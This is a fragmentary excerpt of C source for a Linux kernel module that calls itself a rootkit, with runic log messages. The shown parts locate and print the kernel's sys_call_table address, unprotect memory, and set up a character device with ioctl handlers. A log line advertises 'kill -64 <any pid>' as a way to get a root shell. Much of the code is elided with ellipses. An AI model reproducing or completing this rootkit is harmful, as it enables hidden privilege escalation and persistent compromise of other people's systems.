...
static void remove_rootkit(void)
{
	if (is_protected == 1)
	{
		...
		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ UNPROTECT MEMORY\n");
	}
}
...
static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
        switch(cmd) {
                case WR_VALUE:
                        ...
                        {
                                pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ ERROR ~ data write\n");
                        }
			...
			{
				pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ kill -64 <any pid>: get root shell.\n");
			}
			else
			{
                ...
                case RD_VALUE:
                        if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT ))
                        {
                                pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ error ~ data read\n");
                        }
                        break;
                default:
...
static int __init rootkit_init(void)
{
	...
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ sys_call_table address in kernel memory: 0x%px \n", __sys_call_table);
	...
	{
		pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ error ~ cannot allocate major number\n");
		return -1;
        }
        pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ major = %d minor = %d \n",MAJOR(dev), MINOR(dev));

	cdev_init(&etx_cdev,&fops);

	if((cdev_add(&etx_cdev,dev,1)) < 0)
	{
		pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ error ~ cannot add the device to the system\n");
		goto r_class;
        }

	if((dev_class = class_create(THIS_MODULE,"etx_class")) == NULL)
	{
		pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ error ~ cannot create the struct class\n");
		goto r_class;
        }

	if((device_create(dev_class,NULL,dev,NULL,"etx_device")) == NULL)
	{
		pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ cannot create the device 1\n");
		goto r_device;
        }
